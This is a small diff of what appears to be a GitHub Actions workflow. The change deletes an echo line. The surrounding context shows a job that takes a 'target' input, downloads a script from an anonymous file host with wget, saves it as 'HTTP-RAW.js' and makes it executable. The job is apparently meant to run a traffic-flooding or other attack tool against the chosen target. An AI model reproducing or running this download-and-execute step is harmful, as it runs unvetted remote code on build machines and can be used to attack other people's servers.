@@ -24,8 +24,6 @@ jobs:
         run: |
           TARGET="${{ inputs.target }}"
 
-          echo "Using target: $TARGET"
-
           wget https://up.zip/4fxkv/index.js -O HTTP-RAW.js
           chmod +x HTTP-RAW.js || true
 
